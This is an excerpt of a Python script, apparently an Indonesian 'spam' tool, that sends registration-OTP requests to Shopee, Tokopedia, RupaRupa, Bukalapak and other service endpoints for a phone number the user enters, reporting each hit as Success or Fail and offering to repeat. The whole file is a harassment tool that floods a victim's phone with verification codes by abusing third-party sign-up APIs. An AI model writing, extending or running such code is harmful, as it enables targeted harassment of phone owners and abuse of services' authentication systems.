...
class spam:
	...
	def spam(self):
		hasil=requests.get('https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
		if hasil.status_code == 200:
			return f'\x1b[92mSpamm Shopee {self.nomer} \033[1;32mSuccess!'
		elif hasil.status_code == 500:
			return f'\x1b[91mSpamm Shopee {self.nomer} \x1b[91mFail!'
	...
	def tokped(self):
		...
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mSpamm Tokopedia {self.nomer} \x1b[91mFail!'
		else:
			return f'\x1b[92mSpamm Tokopedia {self.nomer} {h}Success!'
	...
	def phd(self):
		...
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			return f'\x1b[92mSpamm RupaRupa {self.nomer} {h}Success!'
		else:
			return f'\x1b[91mSpamm RupaRupa {self.nomer} {m}Fail!'
	...
	def balaji(self):
		...
		if '{"status":"ok"}' in req.text:
			return f'\x1b[92mSpamm Bukalapak {self.nomer} {h}Success!'
		else:
			return f'\x1b[92mSpamm Bukalapak {self.nomer} {m}Fail!'
	def TokoTalk(self):
...
def apakah():
	while True:
		lan=str(input(k+'\tApa ingin ulangi lagi? y/n : '+h))
		if( lan == 'y' or lan == 'Y'):
			jnspam()
		elif(lan == 'n' or lan == 'N'):
			print(p)
...
def single():
	nomer=str(input(k+'\tNumber Whatsapp : '+h))
...
def jnspam():
	...
	while True:
		...
		if( oy == '1' or oy == '01' ):
			...
			print(m+'             Kok malah pencet Enter')
			continue
	main()
